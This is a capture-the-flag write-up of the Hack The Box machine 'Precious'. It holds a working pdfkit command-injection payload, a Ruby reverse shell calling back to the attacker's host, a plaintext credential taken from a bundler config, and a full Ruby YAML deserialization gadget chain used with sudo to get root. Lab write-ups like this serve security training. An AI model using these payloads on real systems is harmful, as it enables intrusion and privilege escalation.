# easy - Precious



## User flag

Ports scanned

```bash
» sudo nmap --open --min-rate 5000 -T4 -Pn -p- 10.129.36.115
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Getting web server info:

```bash
~p» curl -sI http://precious.htb/
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 483
Connection: keep-alive
Status: 200 OK
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Date: Fri, 02 Dec 2022 02:20:20 GMT
X-Powered-By: Phusion Passenger(R) 6.0.15
Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
X-Runtime: Ruby
```

This form hangs, doesn't appear to do anything...

![image-20221201222102868](../../../../images/articles/precious/image-20221201222102868.png)

It can't load a remote url, so I'm passing a local (network) URL with `python -m http.server`

Then, it can finally generate a PDF file, which by reading its properties I can see this:

```bash
~/Downloads» strings sswaib4m7v3zspozoc5p56tct7mi0ypi.pdf | grep Generated
/Creator (Generated by pdfkit v0.8.6)
    <rdf:li>Generated by pdfkit v0.8.6</rdf:li>
```

By Googling I've found a common CVE: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 and then I've crafted a simple string with does a ping to my host:

```bash
http://10.10.14.17:8000/?name=#{%20`ping -c 1 10.10.14.17`}
```

And then by reviewing my `tun0` icmp with `tcpdump` I started to receive traffic:

```14:57:22.415499 IP precious.htb > layer0: ICMP echo request, id 23221, seq 204, length 64
14:57:22.415529 IP layer0 > precious.htb: ICMP echo reply, id 23221, seq 204, length 64
14:57:23.378068 IP precious.htb > layer0: ICMP echo request, id 23221, seq 205, length 64
14:57:23.378109 IP layer0 > precious.htb: ICMP echo reply, id 23221, seq 205, length 64
```

So basically I can open a reverse shell with help of: https://www.revshells.com/

I will use a ruby interpreter, I know the server has ruby installed by reading these headers:

```
HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Length: 9845
Connection: keep-alive
Status: 200 OK
Content-Disposition: attachment; filename="zydk1oz129qgluc7mh026jarv6u5fn5v.pdf"
Last-Modified: Wed, 14 Dec 2022 02:15:18 GMT
X-Content-Type-Options: nosniff
Date: Wed, 14 Dec 2022 02:15:18 GMT
X-Powered-By: Phusion Passenger(R) 6.0.15
Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
X-Runtime: Ruby
```

I crafted the payload:

```
http://10.10.14.17:8000/?name=#{%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.17",9001))'`}
```

And voilá!

```bash
» nc -lvnp 9001
Connection from 10.129.32.16:33736
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
pwd
/var/www/pdfapp
```

I had to review HTB forums for hints, they suggested to look for hidden things once inside, and here we are:

```bash
ruby@precious:~$ cat .bundle/config
cat .bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

```bash
» ssh henry@precious.htb
The authenticity of host 'precious.htb (10.129.32.16)' can't be established.
...
henry@precious:~$ id
uid=1000(henry) gid=1000(henry) groups=1000(henry)
```

## Root flag

Once inside the box, I'm trying to escalate privileges:

```bash
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Reading the .rb file

```bash
henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

Notice it is reading a file without absolute path :evil: 

Ruby 2.7 has this vulnerability: https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

Creating a vulnerable dependencies.yml:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

Testing the vulnerable yaml file, running command `id`

```bash
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
```

Opening a shell as root:

```bash
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
root@precious:/home/henry# id
uid=0(root) gid=0(root) groups=0(root)
```
